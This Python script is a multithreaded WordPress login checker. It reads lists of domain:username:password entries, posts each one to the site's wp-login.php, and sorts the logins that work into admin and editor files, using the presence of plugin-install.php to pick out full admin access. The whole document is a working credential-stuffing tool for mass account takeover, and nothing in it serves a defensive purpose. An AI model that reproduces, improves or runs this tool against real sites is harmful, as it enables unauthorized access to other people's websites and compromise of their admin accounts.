import requests
import sys
from concurrent.futures import ThreadPoolExecutor

class GasAnjing:
    def __init__(self, url_up):
        self.url_up = url_up

    def check_up(self, url_up):
        try:
            with requests.Session() as req:
                req.headers.update({'User-Agent': 'Mozilla'})
                req.cookies.update({'wordpress_test_cookie': 'WP+Cookie+check'})

                # Update this block to split using ":"
                url_parts = url_up.split(":")
                if len(url_parts) == 3:
                    domain, username, password = url_parts  # Change the order here
                    target_url = f'https://{domain}/wp-login.php'  # Add wp-login.php to the URL
                else:
                    print("[INVALID FORMAT]", url_up)
                    return

                data_pw = {'log': username, 'pwd': password, 'rememberme': 'forever', 'wp-submit': 'Log+In'}
                cek_valid = req.post(target_url, data=data_pw, allow_redirects=True, timeout=10)

                if any(keyword in cek_valid.text for keyword in ['wp-admin', 'logout', 'confirm_admin_email']):
                    if any(keyword in cek_valid.text for keyword in ['plugin-install.php']):
                        print("[ADMIN]", url_up)
                        with open('adminwp.txt', 'a') as admin_file:
                            admin_file.write(url_up + '\n')
                    else:
                        if 'edit-tags.php?taxonomy=category' in cek_valid.text:
                            print("[EDITOR]", url_up, username, password)
                            with open('editor.txt', 'a') as user_file:
                                user_file.write(url_up + '\n')
                        else:
                            print("[INVALID]", url_up)
                else:
                    print("[INVALID]", url_up)

        except KeyboardInterrupt as identifier:
            print("[ERROR]", identifier)
            with open('error.txt', 'a') as error_file:
                error_file.write(url_up + '\n')
        except requests.exceptions.RequestException as e:
            print(f"[E] {domain}")
            with open('error.txt', 'a') as error_file:
                error_file.write(url_up + '\n')

def process_url(url):
    asu = GasAnjing(url)
    asu.check_up(url)

if __name__ == "__main__":
    try:
        if len(sys.argv) < 3:
            print("Usage: python script.py input_file.txt max_threads")
            sys.exit(1)

        input_file = sys.argv[1]
        max_threads = int(sys.argv[2])

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            with open(input_file, 'r', encoding='utf-8') as file:
                for target in file.readlines():
                    targets = target.strip()
                    executor.submit(process_url, targets)

    except KeyboardInterrupt:
        sys.exit(1)
    except Exception as e:
        print("ERROR", e)
        sys.exit(1)
